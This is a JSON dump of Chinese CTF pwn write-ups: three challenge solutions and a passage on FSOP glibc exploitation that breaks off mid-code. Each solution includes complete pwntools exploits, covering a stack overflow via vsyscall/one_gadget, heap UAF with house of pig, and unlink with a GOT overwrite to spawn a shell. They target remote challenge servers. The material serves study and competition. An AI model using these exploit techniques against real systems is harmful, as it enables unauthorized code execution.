[{"title":"1000levevls","url":"/2021/12/01/1000levevls/","content":"检查程序\n开启了pie和nx\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v3; // eax  __int64 v4; // rdx  __int64 v5; // rcx  init_0();  sub_B69();  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      v3 = sub_B00();      if ( v3 != 2 )        break;      hint(a1, a2, v4, v5);    &#125;    if ( v3 == 3 )      break;    if ( v3 == 1 )    &#123;      go(a1, a2, v4, v5);    &#125;    else    &#123;      a1 = &quot;Wrong input&quot;;      puts(&quot;Wrong input&quot;);    &#125;  &#125;  sub_D92(a1, a2, v4, v5);  return 0LL;&#125;\n\nint hint()&#123;  char v1[264]; // [rsp+8h] [rbp-108h] BYREF  if ( unk_20208C )    sprintf(v1, &quot;Hint: %p\\n&quot;, &amp;system);  else    strcpy(v1, &quot;NO PWN NO FUN&quot;);  return puts(v1);&#125;\n\nint go()&#123;  __int64 v1; // [rsp+0h] [rbp-120h]  int v2; // [rsp+8h] [rbp-118h]  int v3; // [rsp+Ch] [rbp-114h]  __int64 v4; // [rsp+10h] [rbp-110h]  __int64 v5; // [rsp+10h] [rbp-110h]  __int64 v6; // [rsp+18h] [rbp-108h]  char v7[256]; // [rsp+20h] [rbp-100h] BYREF  puts(&quot;How many levels?&quot;);  v1 = sub_B00();  if ( v1 &gt; 0 )    v4 = v1;  else    puts(&quot;Coward&quot;);  puts(&quot;Any more?&quot;);  v5 = v4 + sub_B00();  if ( v5 &gt; 0 )  &#123;    if ( v5 &lt;= 99 )    &#123;      v6 = v5;    &#125;    else    &#123;      puts(&quot;You are being a real man.&quot;);      v6 = 100LL;    &#125;    puts(&quot;Let&#x27;s go!&#x27;&quot;);    v2 = time(0LL);    if ( sub_E43(v6) )    &#123;      v3 = time(0LL);      sprintf(v7, &quot;Great job! You finished %d levels in %d seconds\\n&quot;, v6, (v3 - v2));      puts(v7);    &#125;    else    &#123;      puts(&quot;You failed.&quot;);    &#125;    exit(0);  &#125;  return puts(&quot;Coward Coward Coward Coward Coward&quot;);&#125;\n\n_BOOL8 __fastcall sub_E43(signed int a1)&#123;  __int64 v2; // rax  __int64 buf[4]; // [rsp+10h] [rbp-30h] BYREF  unsigned int v4; // [rsp+34h] [rbp-Ch]  unsigned int v5; // [rsp+38h] [rbp-8h]  unsigned int v6; // [rsp+3Ch] [rbp-4h]  buf[0] = 0LL;  buf[1] = 0LL;  buf[2] = 0LL;  buf[3] = 0LL;  if ( !a1 )    return 1LL;  if ( !sub_E43((a1 - 1)) )    return 0LL;  v6 = rand() % a1;  v5 = rand() % a1;  v4 = v5 * v6;  puts(&quot;====================================================&quot;);  printf(&quot;Level %d\\n&quot;, a1);  printf(&quot;Question: %d * %d = ? Answer:&quot;, v6, v5);  read(0, buf, 0x400uLL);  v2 = strtol(buf, 0LL, 10);  return v2 == v4;&#125;\n\n流程分析可以看到E43存在栈溢出但是因为开启了PIE保护所以我们也不知道要ret什么玩意\nvsyscall现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall\nvsyscall的固定地址是0xffffffffff600000–0xffffffffff601000即便是在PIE开启的情况下都是不变的，所以可以用来充当ret的作用\n利用分析其实在上面思路就断了，看了wp发现这道题需要看一看汇编代码，先看hint的代码\n.text:0000000000000D06 ; __unwind &#123;.text:0000000000000D06                 push    rbp.text:0000000000000D07                 mov     rbp, rsp.text:0000000000000D0A                 sub     rsp, 110h.text:0000000000000D11                 mov     rax, cs:system_ptr.text:0000000000000D18                 mov     [rbp+var_110], rax.text:0000000000000D1F                 lea     rax, unk_20208C.text:0000000000000D26                 mov     eax, [rax].text:0000000000000D28                 test    eax, eax.text:0000000000000D2A                 jz      short loc_D57.text:0000000000000D2C                 mov     rax, [rbp+var_110].text:0000000000000D33                 lea     rdx, [rbp+var_110].text:0000000000000D3A                 lea     rcx, [rdx+8].text:0000000000000D3E                 mov     rdx, rax.text:0000000000000D41                 lea     rsi, aHintP     ; &quot;Hint: %p\\n&quot;.text:0000000000000D48                 mov     rdi, rcx        ; s.text:0000000000000D4B                 mov     eax, 0.text:0000000000000D50                 call    _sprintf.text:0000000000000D55                 jmp     short loc_D7C.text:0000000000000D57 ; ---------------------------------------------------------------------------.text:0000000000000D57.text:0000000000000D57 loc_D57:                                ; CODE XREF: hint+24↑j.text:0000000000000D57                 lea     rax, [rbp+var_110].text:0000000000000D5E                 add     rax, 8.text:0000000000000D62                 mov     rsi, 4E204E5750204F4Eh.text:0000000000000D6C                 mov     [rax], rsi.text:0000000000000D6F                 mov     dword ptr [rax+8], 5546204Fh.text:0000000000000D76                 mov     word ptr [rax+0Ch], 4Eh ; &#x27;N&#x27;.text:0000000000000D7C.text:0000000000000D7C loc_D7C:                                ; CODE XREF: hint+4F↑j.text:0000000000000D7C                 lea     rax, [rbp+var_110].text:0000000000000D83                 add     rax, 8.text:0000000000000D87                 mov     rdi, rax        ; s.text:0000000000000D8A                 call    _puts.text:0000000000000D8F                 nop.text:0000000000000D90                 leave.text:0000000000000D91                 retn\n\n虽然hint在反汇编里面看起来是先比较unk_20208C这个地址的值，但是看汇编代码可以看到，他是先将system_addr放到[rbp+var_110]的位置\n在go函数里面也有一个很关键的代码\nv1 = sub_B00();if ( v1 &gt; 0 )\tv4 = v1;else    puts(&quot;Coward&quot;);\n\n关键就关键在v4就是rbp+var_110的位置，继续看汇编代码\n.text:0000000000000B94 ; __unwind &#123;.text:0000000000000B94                 push    rbp.text:0000000000000B95                 mov     rbp, rsp.text:0000000000000B98                 sub     rsp, 120h.text:0000000000000B9F                 lea     rdi, aHowManyLevels ; &quot;How many levels?&quot;.text:0000000000000BA6                 call    _puts.text:0000000000000BAB                 call    sub_B00.text:0000000000000BB0                 mov     [rbp+var_120], rax.text:0000000000000BB7                 mov     rax, [rbp+var_120].text:0000000000000BBE                 test    rax, rax.text:0000000000000BC1                 jg      short loc_BD1.text:0000000000000BC3                 lea     rdi, aCoward    ; &quot;Coward&quot;.text:0000000000000BCA                 call    _puts.text:0000000000000BCF                 jmp     short loc_BDF.text:0000000000000BD1 ; ---------------------------------------------------------------------------.text:0000000000000BD1.text:0000000000000BD1 loc_BD1:                                ; CODE XREF: go+2D↑j.text:0000000000000BD1                 mov     rax, [rbp+var_120].text:0000000000000BD8                 mov     [rbp+var_110], rax.text:0000000000000BDF.text:0000000000000BDF loc_BDF:                                ; CODE XREF: go+3B↑j.text:0000000000000BDF                 lea     rdi, aAnyMore   ; &quot;Any more?&quot;.text:0000000000000BE6                 call    _puts.text:0000000000000BEB                 call    sub_B00.text:0000000000000BF0                 mov     [rbp+var_120], rax.text:0000000000000BF7                 mov     rdx, [rbp+var_110].text:0000000000000BFE                 mov     rax, [rbp+var_120].text:0000000000000C05                 add     rax, rdx.text:0000000000000C08                 mov     [rbp+var_110], rax.text:0000000000000C0F                 mov     rax, [rbp+var_110].text:0000000000000C16                 test    rax, rax.text:0000000000000C19                 jg      short loc_C2C.text:0000000000000C1B                 lea     rdi, aCowardCowardCo ; &quot;Coward Coward Coward Coward Coward&quot;.text:0000000000000C22                 call    _puts.text:0000000000000C27                 jmp     locret_D04\n\n可以看到如果我们输入的v5&lt;0的话就会跳转到loc_BDF位置这个时候我们的[rbp+var_110]就变成可控的了。\n为什么可以这么利用可以看到hint和go都是在main下被调用，所以他们的rbp都是一样的\n接着看栈溢出的函数的汇编代码，主要关注它栈的情况\n.text:0000000000000E43 ; __unwind &#123;.text:0000000000000E43                 push    rbp.text:0000000000000E44                 mov     rbp, rsp.text:0000000000000E47                 sub     rsp, 40h.text:0000000000000E4B                 mov     [rbp+var_34], edi.text:0000000000000E4E                 mov     [rbp+buf], 0.text:0000000000000E56                 mov     [rbp+var_28], 0.text:0000000000000E5E                 mov     [rbp+var_20], 0.text:0000000000000E66                 mov     [rbp+var_18], 0.text:0000000000000E6E                 cmp     [rbp+var_34], 0.text:0000000000000E72                 jnz     short loc_E7E.text:0000000000000E74                 mov     eax, 1.text:0000000000000E79                 jmp     locret_F45\n\n可以看到他就是将rbp换到rsp上然后再减去0x40，那么此时我们栈这块的内存情况就是\n\nsystem地址就在rbp下面的第四个位置，在就是我们只要ret三次就可一到system函数\n这就用到了vsyscall的固定地址是0xffffffffff600000即便是在PIE开启的情况下都是不变的，所以可以用来充当ret的作用\n但是我们就算是ret到了system也没啥用因为我没法控制rdi，题目又给了libc所以很容易想到one_gadget\n\n又因为我们再上面说的这个存放system的地方因为add指令是可以控制的，所以利用思路就是计算one_gadget与system的差值(即便是开启了PIE，他们之间的差值不变)然后利用add指令把system的地址换到one_gadget\nexpfrom pwn import *elf = ELF(&#x27;./100levels&#x27;)libc = ELF(&#x27;./libc.so&#x27;)# r = process(&#x27;./100levels&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 51622)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]one_gadget = 0x4526asystem_addr = libc.symbols[&#x27;system&#x27;]vsyscall_addr = 0xffffffffff600000r.recvuntil(b&#x27;Choice:\\n&#x27;)r.sendline(b&#x27;2&#x27;)r.recvuntil(b&#x27;Choice:\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;How many levels?\\n&#x27;)r.sendline(b&#x27;0&#x27;)r.recvuntil(b&#x27;Any more?\\n&#x27;)r.sendline(bytes(str(one_gadget-system_addr), encoding=&#x27;utf8&#x27;))for i in range(99):    r.recvuntil(b&quot;\\nQuestion: &quot;)    question = r.recvuntil(b&#x27; = ? Answer:&#x27;, drop=True)    print(question)    res = eval(question)    r.sendline(bytes(str(res), encoding=&#x27;utf8&#x27;))payload = b&#x27;a&#x27;*(0x30+0x8)+p64(vsyscall_addr)*3r.recvuntil(b&#x27; = ? Answer:&#x27;)r.send(payload)r.interactive()\n","categories":["pwn-xctf"],"tags":["栈溢出","vsyscall"]},{"title":"*CTF-examination","url":"/2022/04/17/CTF-examination/","content":"examination太菜了只做了第一道题，第二道题死活找不到漏洞点\n流程分析这道题的流程挺明确的，因为是c语言逆向起来比较简单这里就不再赘述逆向过程了。\n总的来说程序就是下图所示的这个结构\n\n首先就是程序存在一个可以让我们任意地址+1的函数，利用此函数造成UAF，进而泄漏出libc地址，随后继续利用UAF控制结构体的指向，进而控制tcache_struct最后使用house of pig的最后一步即可。\nexpfrom pwn import *elf = ELF(&#x27;./examination&#x27;)# r = process(&#x27;./examination&#x27;)r = remote(&#x27;124.70.130.92&#x27;, 60001)libc = ELF(&#x27;./libc-2.31.so&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;def menu(choice):    r.sendlineafter(b&#x27;choice&gt;&gt; &#x27;, bytes(str(choice), encoding=&#x27;utf-8&#x27;))def create(question_num):    menu(1)    r.recvuntil(b&#x27;enter the number of questions: &#x27;)    r.sendline(bytes(str(question_num), encoding=&#x27;utf8&#x27;))def score():    menu(2)def write_review(idx, comment, size=None):    menu(3)    r.sendlineafter(b&#x27;which one? &gt; &#x27;, bytes(str(idx), encoding=&#x27;utf-8&#x27;))    if size is not None:        r.recvuntil(b&#x27;please input the size of comment: &#x27;)        r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.sendafter(b&#x27;enter your comment:&#x27;, comment)def delete(idx):    menu(4)    r.recvuntil(b&#x27;which student id to choose?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def change_role(role):    menu(5)    r.recvuntil(b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;)    r.sendline(bytes(str(role), encoding=&#x27;utf-8&#x27;))def check_review(addr=None):    menu(2)    if addr is not None:        r.recvuntil(b&#x27;add 1 to wherever you want! addr: &#x27;)        r.sendline(bytes(str(addr), encoding=&#x27;utf-8&#x27;))def xor_pray():    menu(3)def set_mod(score, mod=None):    menu(4)    if mod is not None:        r.recvuntil(b&#x27;enter your mode!&#x27;)        r.send(mod)    else:        r.recvuntil(b&#x27;enter your pray score: 0 to 100&#x27;)        r.sendline(bytes(str(score), encoding=&#x27;utf-8&#x27;))def change_id(idx):    menu(6)    r.recvuntil(b&#x27;input your id: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def gift(content):    menu(6)    r.recvuntil(b&#x27;never pray again!&#x27;)    r.send(content)r.recvuntil(b&#x27;role: &lt;0.teacher/1.student&gt;:&#x27;)r.sendline(b&#x27;0&#x27;)create(9)create(1)change_role(1)change_id(1)xor_pray()change_role(0)score()write_review(1, b&#x27;dzhsb&#x27;, 0x350)write_review(0, b&#x27;a&#x27; * 240 + flat(0x460, 0x261), 0x350)change_role(1)change_id(1)check_review()r.recvuntil(b&#x27;Good Job! Here is your reward! &#x27;)chunk_base = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True), base=16) - 0x2f0print(hex(chunk_base))r.recvuntil(b&#x27;add 1 to wherever you want! addr: &#x27;)r.send(bytes(str(chunk_base + 0x339), encoding=&#x27;utf-8&#x27;))change_role(0)delete(1)create(1)write_review(1, b&#x27;wow&#x27;, 800 - 0x20)change_role(1)change_id(0)check_review()r.recvuntil(b&#x27;here is the review:\\n&#x27;)main_arena_96 = u64(r.recv(8))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]change_role(0)create(9)write_review(    0, flat(chunk_base + 0x6d0, 0, 0, 0, 0, 0x21, 0x1, chunk_base + 0x10,            0x290))write_review(    2,    b&#x27;7&#x27; * 0xc0 + p64(libc.symbols[&#x27;__free_hook&#x27;] + libc_base - 0x10) + b&#x27;7&#x27; *    (0x200 - 8 * 2 - 0xc0) + p64(libc_base + libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]))def pack_file(_IO_write_base=0,              _IO_write_ptr=0,              _IO_buf_base=0,              _IO_buf_end=0,              vtable=0):    IO_FILE = p64(0)*3+p64(0) + \\        p64(_IO_write_base)+p64(_IO_write_ptr) + \\        p64(0)+p64(_IO_buf_base)+p64(_IO_buf_end)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(0)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;) + p64(vtable)    return IO_FILE_IO_str_jumps = libc_base + 0x1e9560print(hex(libc_base))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))file_struct = pack_file(    1, 0xffffffffffff, libc_base + libc.symbols[&#x27;_IO_2_1_stderr_&#x27;] + 0xe0,    libc_base + libc.symbols[&#x27;_IO_2_1_stderr_&#x27;] + 0xe0 + 0x18, _IO_str_jumps)file_struct += b&#x27;/bin/sh\\x00&#x27; + p64(system_addr) * 2gift(file_struct + b&#x27;\\n&#x27;)# gdb.attach(r)r.interactive()\n\nhouse of pig源码层面分析\n","categories":["比赛wp"],"tags":["house of pig","HeapFengShui"]},{"title":"4-ReeHY-main","url":"/2021/12/03/4-ReeHY-main/","content":"保护检查\n就开了个NX\nvoid __fastcall main(__int64 a1, char **a2, char **a3)&#123;  sub_400856(a1, a2, a3);  while ( 1 )  &#123;    menu();    switch ( sub_400C55() )    &#123;      case 1u:        create();        break;      case 2u:        delete();        break;      case 3u:        edit();        break;      case 4u:        show();        break;      case 5u:        puts(&quot;bye~bye~ young hacker&quot;);        exit(0);      default:        puts(&quot;Invalid Choice!&quot;);        break;    &#125;  &#125;&#125;\n\nint sub_400856()&#123;  void *buf; // [rsp+8h] [rbp-8h]  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  chunk_size = malloc(0x14uLL);  puts(&quot;Input your name: &quot;);  write(1, &quot;$ &quot;, 2uLL);  buf = malloc(0x20uLL);  read(0, buf, 0x20uLL);  write(1, &quot;Hello &quot;, 6uLL);  return puts(buf);&#125;\n\nint create()&#123;  int result; // eax  char buf[128]; // [rsp+0h] [rbp-90h] BYREF  void *dest; // [rsp+80h] [rbp-10h]  int v3; // [rsp+88h] [rbp-8h]  size_t nbytes; // [rsp+8Ch] [rbp-4h]  result = chunk_id;  if ( chunk_id &lt;= 4 )  &#123;    puts(&quot;Input size&quot;);    result = sub_400C55();    LODWORD(nbytes) = result;    if ( result &lt;= 4096 )    &#123;      puts(&quot;Input cun&quot;);      result = sub_400C55();      v3 = result;      if ( result &lt;= 4 )      &#123;        dest = malloc(nbytes);        puts(&quot;Input content&quot;);        if ( nbytes &gt; 112 )        &#123;          read(0, dest, nbytes);        &#125;        else        &#123;          read(0, buf, nbytes);          memcpy(dest, buf, nbytes);        &#125;        *(chunk_size + 4LL * v3) = nbytes;        *(&amp;chunk + 2 * v3) = dest;        dword_6020E8[4 * v3] = 1;        ++chunk_id;        result = fflush(stdout);      &#125;    &#125;  &#125;  return result;&#125;\n\n__int64 delete()&#123;  __int64 result; // rax  int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Chose one to dele&quot;);  result = sub_400C55();  v1 = result;  if ( result &lt;= 4 )  &#123;    free(*(&amp;chunk + 2 * result));    dword_6020E8[4 * v1] = 0;    puts(&quot;dele success!&quot;);    result = --chunk_id;  &#125;  return result;&#125;\n\nint edit()&#123;  int result; // eax  int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Chose one to edit&quot;);  result = sub_400C55();  v1 = result;  if ( result &lt;= 4 )  &#123;    result = dword_6020E8[4 * result];    if ( result == 1 )    &#123;      puts(&quot;Input the content&quot;);      read(0, *(&amp;chunk + 2 * v1), *(4LL * v1 + chunk_size));      result = puts(&quot;Edit success!&quot;);    &#125;  &#125;  return result;&#125;\n\nshow是不输出东西的\n流程分析sub_400856函数:创建一个堆块用来存放其他堆块的大小\ncreate函数:创建一个堆块放在*(&amp;chunk + 2 * v3)里面，不存在堆溢出\ndelete函数:将一个堆块free掉，没有清除指针，但是用于存放堆块是否处于use状态的指变为了0\nedit函数:根据前面在chunk_size这个堆块里面的值来确定写入的大小，看似也没有堆溢出\n漏洞点delete函数在free的时候是没有检验选择的chunk是否越界，所以我们可以free掉储存chunk大小的堆块然后再create的时候修改其内部的值，就可以造成堆溢出，又因为没有开启PIE保护，理所应当想到unlink漏洞。后面就是需要泄漏地址计算便宜量，其实很好理解，我直接把exp贴出来配合payload很好理解的\nexp:\nfrom pwn import *from LibcSearcher import *elf = ELF(&#x27;./4-ReeHY-main&#x27;)libc = ELF(&#x27;./ctflibc.so.6&#x27;)# r = process(&#x27;./4-ReeHY-main&#x27;, env=&#123;&quot;LD_PRELOAD&quot;: &quot;ctflibc.so.6&quot;&#125;)r = remote(&#x27;111.200.241.244&#x27;, 52152)context.log_level = &#x27;debug&#x27;chunk_arr = 0x6020E0free_got = elf.got[&#x27;free&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]atoi_got = elf.got[&#x27;atoi&#x27;]def create(size, id, content):    r.recvuntil(b&#x27;$ &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Input size\\n&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Input cun\\n&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Input content\\n&#x27;)    r.send(content)def delete(id):    r.recvuntil(b&#x27;$ &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Chose one to dele&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def edit(id, content):    r.recvuntil(b&#x27;$ &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Chose one to edit\\n&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Input the content\\n&#x27;)    r.send(content)r.recvuntil(b&#x27;$ &#x27;)r.sendline(b&#x27;196082&#x27;)create(0x100, 0, b&#x27;a&#x27;*0x100)create(0x100, 1, b&#x27;b&#x27;*0x100)# gdb.attach(r)# pause()delete(-2)# gdb.attach(r)payload = p32(0x200)+p32(0x100)create(0x14, 2, payload)payload = p64(0)+p64(0x101)+p64(chunk_arr-0x8*3) + \\    p64(chunk_arr-0x8*2)+b&#x27;a&#x27;*(0x100-0x8*4)+p64(0x100)+p64(0x110)edit(0, payload)delete(1)payload = p64(0)*3+p64(free_got)+p64(1) + \\    p64(atoi_got)+p64(1)+p64(atoi_got)+p64(1)edit(0, payload)edit(0, p64(puts_plt))delete(1)atoi_addr = u64(r.recvuntil(b&#x27;\\ndele success!&#x27;, drop=True)                [1:].ljust(8, b&#x27;\\x00&#x27;))print(hex(atoi_addr))libc = LibcSearcher(&#x27;atoi&#x27;, atoi_addr)offset = atoi_addr-libc.dump(&#x27;atoi&#x27;)system_addr = offset+libc.dump(&#x27;system&#x27;)edit(2, p64(system_addr))r.recvuntil(b&#x27;$ &#x27;)r.sendline(b&#x27;/bin/sh\\x00&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["unlink"]},{"title":"FSOP","url":"/2022/02/23/FSOP/","content":"文章开头给出_IO_FILE结构体的偏移:\n0x0   _flags0x8   _IO_read_ptr0x10  _IO_read_end0x18  _IO_read_base0x20  _IO_write_base0x28  _IO_write_ptr0x30  _IO_write_end0x38  _IO_buf_base0x40  _IO_buf_end0x48  _IO_save_base0x50  _IO_backup_base0x58  _IO_save_end0x60  _markers0x68  _chain0x70  _fileno0x74  _flags20x78  _old_offset0x80  _cur_column0x82  _vtable_offset0x83  _shortbuf0x88  _lock0x90  _offset0x98  _codecvt0xa0  _wide_data0xa8  _freeres_list0xb0  _freeres_buf0xb8  __pad50xc0  _mode0xc4  _unused20xd8  vtable\n\nGlibc2.23下的FSOPFSOP全称是File Stream Oriented Programming进程中打开的所有文件结构体使用一个单链表来进行管理，即通过_IO_list_all进行管理，在fopen的分析中，我们知道了fopen是通过_IO_link_in函数将新打开的结构体链接进入_IO_list_all的，相关的代码如下：\nfp-&gt;file._flags |= _IO_LINKED;...fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;_IO_list_all = fp;\n\n从代码中也可以看出来链表是通过FILE结构体的_chain字段来进行链接的。所以也就形成了链表。\n看到链表的操作，应该就大致猜到了FSOP的主要原理了。即通过伪造_IO_list_all中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改_IO_list_all直接指向可控的地址。\n具体来说该如何利用呢？glibc中有一个函数_IO_flush_all_lockp，该函数的功能是刷新所有FILE结构体的输出缓冲区，相关源码如下，文件在libio\\genops中：\nint_IO_flush_all_lockp (int do_lock)&#123;  int result = 0;  struct _IO_FILE *fp;  int last_stamp;  fp = (_IO_FILE *) _IO_list_all;  while (fp != NULL)    &#123;    ...      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T     || (_IO_vtable_offset (fp) == 0         &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr            &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif     )    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)  result = EOF;        fp = fp-&gt;_chain;    &#125;...&#125;\n\n通过对上面代码的分析我们知道fp-&gt;_IO_write_base处保存这输出缓冲区的数据，并且长度为fp-&gt;_IO_write_ptr-fp-&gt;_IO_write_base，所以上面的if语句实际上就是判断缓冲区是否还有数据，如果有的话就会调用_IO_OVERFLOW去清空缓冲区，其中_IO_OVERFLOW是vtable当中的函数，所以我们若是能够控制_IO_list_all的话就可以控制程序执行流。\n而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：\n\n当 libc 执行 abort 流程时\n\n当执行 exit 函数时\n\n当执行流从 main 函数返回时\n\n\n利用方式伪造_IO_FILE结构体，并且利用漏洞使_IO_list_all指向我们伪造的结构体(当然这里我们可以使用任意结构体_chain字段)，最终触发_IO_flush_all_lockp，绕过检查实现执行流的劫持。\n其中需要绕过的也就是上面的缓冲区，所以只需要\n\nfp-&gt;_mode = 0;\nfp-&gt;_IO_write_ptr = 1;\nfp-&gt;_IO_write_base=0;\n\n最后把vtable修改为我们的system就好。\nGlibc2.24到Glibc2.27下的FSOP在Glibc2.24下，若是直接同上面的构造方式构造就会出现报错，这是因为在这个版本的Glibc下存在一种保护机制。\nvtable check机制分析在执行_IO_OVERLOW时，会先执行到IO_validate_vtable函数，这是因为_IO_OVERLOW的宏定义发生了改变\n#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n\n#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)\n\n# define _IO_JUMPS_FUNC(THIS) \\  (IO_validate_vtable                                                   \\   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \\                 + (THIS)-&gt;_vtable_offset)))\n\n可以看到是在最后调用vtable的函数之前调用了IO_validate_vtable函数。\nstatic inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)&#123;  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;  const char *ptr = (const char *) vtable;  uintptr_t offset = ptr - __start___libc_IO_vtables;  if (__glibc_unlikely (offset &gt;= section_length))    /* The vtable pointer is not in the expected section.  Use the       slow path, which will terminate the process if necessary.  */    _IO_vtable_check ();  return vtable;&#125;\n\n在上述代码当中，__start___libc_IO_vtables指向了第一个vtable的地址_IO_helper_jumps，__stop___libc_IO_vtables指向了最后一个vtable函数_IO_str_chk_jumps的结束地址。上面检验的就是当前的vtable是否在这两个地址之间。因此，简单的覆盖vtable是无法通过检查的。\n利用方式其实在上述的check机制分析当中还存在一个检查外部vtable是否合法，不过存在的问题是我们无法控制flag，因为其是随机产生的。所以，我们使用的利用方式还是内部的vtable，使用到了vtable是_IO_str_jumps。\n首先观察其源码当中定义的函数表：\nconst struct _IO_jump_t _IO_str_jumps libio_vtable =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_str_finish),  JUMP_INIT(overflow, _IO_str_overflow),  JUMP_INIT(underflow, _IO_str_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_str_pbackfail),  JUMP_INIT(xsputn, _IO_default_xsputn),  JUMP_INIT(xsgetn, _IO_default_xsgetn),  JUMP_INIT(seekoff, _IO_str_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_default_setbuf),  JUMP_INIT(sync, _IO_default_sync),  JUMP_INIT(doallocate, _IO_default_doallocate),  JUMP_INIT(read, _IO_default_read),  JUMP_INIT(write, _IO_default_write),  JUMP_INIT(seek, _IO_default_seek),  JUMP_INIT(close, _IO_default_close),  JUMP_INIT(stat, _IO_default_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue)&#125;;\n\n上面是我在Glibc源码当中看到的，下面是我调试出来的：\n\n不过可以看到的是源码中的JUMP_INIT_DUMMY占了16字节。所以_IO_str_finish的偏移量为0x10，而_IO_str_overflow的偏移量为0x18。\n再来看_IO_str_finish的源码：\nvoid_IO_str_finish (_IO_FILE *fp, int dummy)&#123;  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);   fp-&gt;_IO_buf_base = NULL;  _IO_default_finish (fp, 0);&#125;\n\n可以看到直接使用了fp-&gt;_s._free_buffer当作函数地址，参数即为_IO_buf_base。到了这一步，利用方式就很明显了。\n下面构造结构体，同样的，我们仍需要绕过之前_IO_flush_all_lokcp函数中的检测，也就是_mode&lt;=0以及_IO_write_ptr&gt;_IO_write_base。然后重点就是vtable的地址我们不能直接的_IO_str_jumps，我们应当写入_IO_str_jumps-8，这里解释一下，因为我们在绕过_IO_flush_all_lokcp的检查后会调用到_IO_OVERFLOW函数，但是我们真正要进入的其实是_IO_str_finish函数，又因为他相对与vtable的偏移量刚好比_IO_OVERFLOW小8个字节，所以减去8即可执行到_IO_str_finish。\n接着问题就是(((_IO_strfile *) fp)-&gt;_s._free_buffer)函数相对于fp的偏移量是多少，调试结果出来发现偏移量是0xe8，最后在fp-&gt;_IO_buf_base的地方写上/bin/sh的地址即可getshell。\n这里给出打包的函数：\ndef pack_file(_IO_read_base=0, _IO_write_base=0, _IO_write_ptr=0, _IO_buf_base=0, _mode=0, vtable=0):    IO_FILE = p64(0)*3+p64(_IO_read_base) + \\        p64(_IO_write_base)+p64(_IO_write_ptr)+p64(0)+p64(_IO_buf_base)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(_mode)    IO_FILE = IO_FILE.ljust(0xd8, 